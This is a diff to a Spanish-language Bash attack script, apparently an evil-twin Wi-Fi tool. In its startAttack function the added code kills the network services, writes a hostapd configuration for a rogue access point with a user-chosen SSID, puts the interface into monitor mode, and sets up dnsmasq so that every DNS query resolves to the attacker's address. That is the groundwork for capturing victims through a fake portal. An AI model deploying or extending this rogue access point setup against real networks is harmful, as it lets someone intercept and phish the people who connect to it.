@@ -73,12 +73,51 @@ function startAttack(){
 	for interface in $(cat iface); do
 		echo -e "\t\n${blueColour}$counter.${endColour}${yellowColour} $interface${endColour}"; sleep 0.26
 		let counter++
-	done; tput cnorm && echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Interfaz de red a utilizar (${endColour}${redColour}Es necesario que esté en modo monitor${endColour}${blueColour}): ${endColour}" && read myInterface
+	done; tput cnorm && echo -ne "\n${yellowColour}[*]${endColour}${blueColour} Interfaz de red a utilizar: ${endColour}" && read myInterface
 	choosed_interface=$(sed ''$myInterface'q;d' iface)
 	rm iface 2>/dev/null
 	echo -ne "\n${yellowColour}[*]${endColour}${grayColour} Nombre del punto de acceso a utilizar:${endColour} " && read -r use_ssid
 	echo -ne "${yellowColour}[*]${endColour}${grayColour} Canal a utilizar:${endColour} " && read use_channel
+	echo -e "\n${redColour}[!] Matando todas las conexiones...${endColour}\n"
+	sleep 2
+	killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1
+	sleep 5
 
+	echo -e "interface=$choosed_interface\n" > hostapd.conf
+	echo -e "driver=nl80211\n" >> hostapd.conf
+	echo -e "ssid=$use_ssid\n" >> hostapd.conf
+	echo -e "hw_mode=g\n" >> hostapd.conf
+	echo -e "channel=$use_channel\n" >> hostapd.conf
+	echo -e "macaddr_acl=0\n" >> hostapd.conf
+	echo -e "auth_algs=1\n" >> hostapd.conf
+	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
+
+	echo -e "${yellowColour}[*]${endColour}${grayColour} Configurando modo monitor la interfaz $choosed_interface${endColour}\n"
+	ifconfig $choosed_interface down; sleep 2
+	iwconfig $choosed_interface mode monitor
+	ifconfig $choosed_interface up
+	sleep 2
+	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Iniciando hostapd...${endColour}"
+	hostapd hostapd.conf > /dev/null 2>&1 &
+	sleep 6
+
+	echo -e "\n${yellowColour}[*]${endColour}${grayColour} Configurando dnsmasq...${endColour}\n"
+	echo -e "interface=$choosed_interface\n" > dnsmasq.conf
+	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
+	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
+	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
+	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
+	echo -e "log-queries\n" >> dnsmasq.conf
+	echo -e "log-dhcp\n" >> dnsmasq.conf
+	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
+	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
+
+	ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0
+	sleep 1
+	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
+	sleep 1
+	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
+	sleep 5
 }
 
 # Main Program
